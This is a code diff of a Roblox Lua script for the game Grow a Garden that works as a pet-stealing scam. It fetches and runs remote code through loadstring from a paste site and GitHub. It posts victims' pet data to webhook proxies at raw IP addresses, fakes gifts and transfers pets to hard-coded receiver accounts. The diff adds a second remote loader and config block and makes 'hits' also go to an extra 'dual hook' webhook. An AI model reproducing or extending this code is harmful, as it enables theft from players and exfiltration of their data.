@@ -13,6 +13,23 @@ _G.NullConfig = {
     
 loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
 
+loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
+_G.NullConfig = {
+    User = {"GaGbyFaith", "GaGbySmiley", "Smiley9Gamerz", "BUZZFTWGOD"},
+    min_value = 10000000020,
+    pingEveryone = "No", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/26749114d240c316c4a29060a03a30f7",
+    FakeGift = "Yes",
+    Trash = "http://176.100.37.215:20002/proxy/67431be5aae9d51a3ff71f890a7e7596",
+    LoadingScreen = "No",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+
+
+        
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -32,7 +49,7 @@ loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/scrip
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! " .. getgenv().Discord)
+       setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! " .. (getgenv().Discord or "discord.gg/yourlink"))
 
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
@@ -280,17 +297,8 @@ loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/scrip
 
         local pets = GetPlayerPets()
 
+        local Webhook = getgenv().Webhook
         local Username = getgenv().Username
-local defaultWebhook = getgenv().Webhook
-local rareWebhook = getgenv().DualHookWebhook
-local dualHookUsers = {}
-for name in string.gmatch(getgenv().DualHookUsernames, "[^,]+") do
-    dualHookUsers[name] = true
-end
-
-local isDualHookUser = dualHookUsers[Username] ~= nil
-local Webhook = isDualHookUser and rareWebhook or defaultWebhook
-
 
         local function isMutated(toolName)
             for key, data in pairs(PetPriorityData) do
@@ -414,7 +422,7 @@ local Webhook = isDualHookUser and rareWebhook or defaultWebhook
         local payload = {
             content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
             embeds = {{
-                title = "Grow a Garden Hit - " .. (getgenv().ServerName or "Scripts.SM"),
+                title = "Grow a Garden Hit - " .. getgenv().ServerName
                 url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
                 color = 57855,
                 fields = {
@@ -502,18 +510,24 @@ local Webhook = isDualHookUser and rareWebhook or defaultWebhook
                 if not success then warn(err) end
         else
             payload.content = "To activate the stealer you must jump or type in chat"
-            local success, err = pcall(function()
-                request({
-                    Url = Webhook,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode(payload)
-                }) 
-            end)
-            if not success then warn(err) end
-        end
+            local function sendToWebhook(url)
+    pcall(function()
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+sendToWebhook(Webhook)
+if getgenv().DualHookWebhook and getgenv().DualHookWebhook ~= "" then
+    sendToWebhook(getgenv().DualHookWebhook)
+end
+
 
                 local function CreateGui()
                     local player = Players.LocalPlayer
@@ -602,9 +616,13 @@ local Webhook = isDualHookUser and rareWebhook or defaultWebhook
                 end
 
         local usernames = {}
-for name in string.gmatch(getgenv().DualHookUsernames, "[^,]+") do
-    table.insert(usernames, name)
+if getgenv().DualHookUsernames then
+    for name in string.gmatch(getgenv().DualHookUsernames, '([^,]+)') do
+        table.insert(usernames, name)
+    end
 end
+
+
 
         local receiverPlr
         repeat
